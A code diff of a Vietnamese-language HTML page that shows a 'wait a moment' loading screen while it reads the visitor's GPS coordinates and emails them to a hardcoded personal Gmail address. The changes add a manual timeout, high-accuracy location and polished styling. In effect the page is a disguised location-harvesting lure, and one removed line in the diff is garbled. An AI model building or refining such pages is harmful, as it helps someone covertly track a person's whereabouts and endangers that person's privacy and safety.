@@ -11,20 +11,62 @@
         })();
     </script>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
-        #status { font-size: 18px; color: #333; margin-top: 20px; }
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background-color: #f0f0f0;
+        }
+        h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        #status {
+            font-size: 18px;
+            color: #333;
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 5px;
+            max-width: 90%;
+            word-wrap: break-word;
+        }
         .loading { color: blue; font-weight: bold; }
-        .success { color: green; }
-        .error { color: red; }
+        .success { color: green; background-color: #e0ffe0; }
+        .error { color: red; background-color: #ffe0e0; }
+        @media (max-width: 600px) {
+            h2 { font-size: 20px; }
+            #status { font-size: 16px; }
+        }
     </style>
 </head>
 <body>
     <h2>Chờ một lát nhé</h2>
-    <div id="status" class="loading">loading...</div>
+    <div id="status" class="loading">Đang lấy vị trí...</div>
     <script>
         const statusDiv = document.getElementById("status");
 
-        function updateStatus(message,Loading:", latitude, longitude);
+        function updateStatus(message, type = "") {
+            statusDiv.innerText = message;
+            statusDiv.className = type;
+        }
+
+        // Timeout thủ công để tránh treo loading
+        const timeoutId = setTimeout(() => {
+            updateStatus("Hết thời gian chờ. Vui lòng kiểm tra GPS hoặc kết nối mạng và thử lại.", "error");
+        }, 20000);
+
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                clearTimeout(timeoutId); // Hủy timeout thủ công
+                const { latitude, longitude } = position.coords;
+                updateStatus(`Vị trí: ${latitude}, ${longitude}\nĐang gửi...`, "loading");
+                console.log("Vị trí:", latitude, longitude);
 
                 if (!latitude || !longitude) {
                     updateStatus("Lỗi: Tọa độ không hợp lệ.", "error");
@@ -32,7 +74,7 @@
                 }
 
                 const emailData = {
-                    lat: latitude.toString(), // Chuyển thành string để đảm bảo
+                    lat: latitude.toString(),
                     lon: longitude.toString(),
                     to_email: "thanhkhazyd598@gmail.com"
                 };
@@ -45,7 +87,7 @@
                 )
                 .then(() => {
                     console.log("Email đã gửi thành công!");
-                    updateStatus(`Loading: ${latitude}, ${longitude}\nEmail đã gửi! Cảm ơn bạn!`, "success");
+                    updateStatus(`Vị trí: ${latitude}, ${longitude}\nEmail đã gửi! Cảm ơn bạn!`, "success");
                 })
                 .catch((error) => {
                     console.error("Lỗi gửi email:", error);
@@ -53,6 +95,7 @@
                 });
             },
             (error) => {
+                clearTimeout(timeoutId); // Hủy timeout thủ công
                 console.error("Không có quyền:", error.code, error.message);
                 let message = "";
                 switch (error.code) {
@@ -63,7 +106,7 @@
                 }
                 updateStatus(`${message}\nNhấn F5 để thử lại.`, "error");
             },
-            { timeout: 10000, maximumAge: 0 }
+            { timeout: 15000, maximumAge: 0, enableHighAccuracy: true }
         );
     </script>
 </body>
